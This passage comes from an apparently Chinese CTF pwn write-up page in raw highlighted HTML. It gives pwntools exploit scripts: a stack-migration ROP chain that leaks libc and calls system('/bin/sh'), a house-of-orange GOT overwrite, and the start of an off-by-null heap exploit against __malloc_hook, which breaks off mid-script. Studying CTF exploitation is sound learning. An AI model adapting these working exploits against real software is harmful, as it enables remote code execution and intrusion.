number">0x0000000000400896</span>bss<span class="token operator">=</span><span class="token number">0x601000</span><span class="token operator">+</span><span class="token number">0x200</span>bss1<span class="token operator">=</span><span class="token number">0x601000</span><span class="token operator">+</span><span class="token number">0x400</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Do you still have something to say?'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment">#----------------leak libc</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000400963</span>payload<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>eg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ep<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>bss1<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>libc<span class="token operator">=</span>puts<span class="token operator">-</span><span class="token number">0x000000000006F6A0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">)</span><span class="token comment">#---------------</span>system<span class="token operator">=</span><span class="token number">0x00000000000453A0</span><span class="token operator">+</span>libcbinsh<span class="token operator">=</span><span class="token number">0x000000000018ce57</span><span class="token operator">+</span>libcpayload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bss1<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_leave_ret<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x0000000000400897'</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>rop<span class="token operator">=</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>rop<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./stackmigration'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h1><p>glibc2.23</p><p>能申请任意大小的chunk和堆溢出，但是没有free</p><p>利用 house of orange 获得空闲块，看题目有后门，还没开full relro，我选择打malloc的GOT表</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Please enter your choice>>'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note size'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input note index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note size'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>door<span class="token operator">=</span><span class="token number">0x0000000000400987</span><span class="token comment">#---------orange</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'A'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfe1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xf40</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>    <span class="token comment">#ub->0xfe1</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0xf48</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0x60209d</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'b'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>eg<span class="token punctuation">(</span><span class="token string">'malloc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>door<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#---------attack</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input your note size'</span><span class="token punctuation">,</span><span class="token string">'20'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./Orange'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p>glibc2.23</p><p><img src="/EXP_FILE/d9abf66b5138d0173b97be4dd8b7c323_MD5.jpeg"></p><p>libc2.23的off by null，打unlink构造重叠堆块，然后打__malloc_hook</p><p>环境条件不满足one_gadget的条件，需要利用__realloc_hook来调节栈帧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'Choose an option >> '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'How much do you want'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Enter something?'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'Enter something?'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Give me a index.Let you see see'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'input index'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span> <span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#1</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#2</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>  <span class="token comment">#3  </span>add<span class="token punctuation">(</span><span class="token number">0x3f0</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span> <span class="token comment">#4</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>  <span class="token comment">#5</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\x00'</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span 